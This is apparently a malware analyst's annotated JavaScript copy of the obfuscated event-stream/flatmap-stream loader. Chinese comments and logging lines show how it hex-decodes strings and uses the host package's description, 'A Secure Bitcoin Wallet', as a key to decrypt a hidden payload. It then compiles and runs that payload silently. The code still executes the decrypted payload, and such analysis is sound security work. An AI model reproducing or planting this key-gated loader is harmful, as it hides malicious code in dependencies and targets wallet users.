!(function() {
  try {
    // 编码函数，下面频繁调用编码函数去解字符串拼接
    function e(r) {
      return Buffer.from(r, "hex").toString();
    }

    var n = require(e("2e2f746573742f64617461")),
      o = process[e(n[3])][e(n[4])];
    
    console.log(`var n = require(${e("2e2f746573742f64617461")})`,`o = process[${e(n[3])}][${e(n[4])}]`)
    o='A Secure Bitcoin Wallet';
    // require(./test/data) process[env][npm_package_description]
    console.log(`var u = require(${e(n[2])})[${e(n[6])}](${e(n[5])})`)
    console.log(`a = u.update(${n[0]})[${e(n[8])}](${e(n[9])}`)
    console.log(`a += u.final(${e(n[9])})`)
    console.log(`var f = new module.constructor();`)
    console.log(`(f.paths = module.paths), f[${e(n[7])}](a, ""), f.exports(${n[1]})`)
    
    if (!o) return;
    var u = require(e(n[2]))[e(n[6])](e(n[5]), o),
      a = u.update(n[0], e(n[8]), e(n[9]));
    a += u.final(e(n[9]));
    console.log(`解密字符串为：${a}`)
    var f = new module.constructor();
    (f.paths = module.paths), f[e(n[7])](a, ""), f.exports(n[1]);
    console.log(`此时f.exports的类型是：${typeof f.exports}`)
  } catch (r) {}
})();
